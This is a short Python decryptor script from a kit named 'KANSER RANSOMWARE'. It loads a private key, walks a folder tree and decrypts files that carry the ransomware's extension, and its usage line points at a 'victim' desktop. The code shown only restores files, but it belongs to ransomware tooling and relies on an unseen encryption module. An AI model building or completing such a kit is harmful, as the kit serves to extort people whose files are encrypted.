#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
KANSER RANSOMWARE — Decryptor Tool
Private key ile tum dosyalari cozer
"""
import os, sys, json
from crypter import decrypt_file, CONFIG

def decrypt_all(private_key_pem, target_dir=None):
    from crypter import default_backend
    from cryptography.hazmat.primitives.serialization import load_pem_private_key
    private_key = load_pem_private_key(private_key_pem.encode(), password=None, backend=default_backend())

    base = target_dir or os.path.expanduser("~")
    count = 0
    for root, dirs, files in os.walk(base):
        for f in files:
            if f.endswith(CONFIG["extension"]):
                fp = os.path.join(root, f)
                if decrypt_file(fp, private_key, CONFIG["extension"]):
                    count += 1
                    if count % 50 == 0: print(f"[+] Decrypted: {count}")
    print(f"\n[+] TOTAL DECRYPTED: {count}")

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Usage: python decryptor.py <private_key.pem> [target_dir]")
        print("       python decryptor.py key.pem C:\\Users\\victim\\Desktop")
        sys.exit(1)
    key_path = sys.argv[1]
    target = sys.argv[2] if len(sys.argv) > 2 else None
    if not os.path.exists(key_path):
        print(f"[-] Key file not found: {key_path}")
        sys.exit(1)
    with open(key_path, "r") as f: key_pem = f.read()
    decrypt_all(key_pem, target)
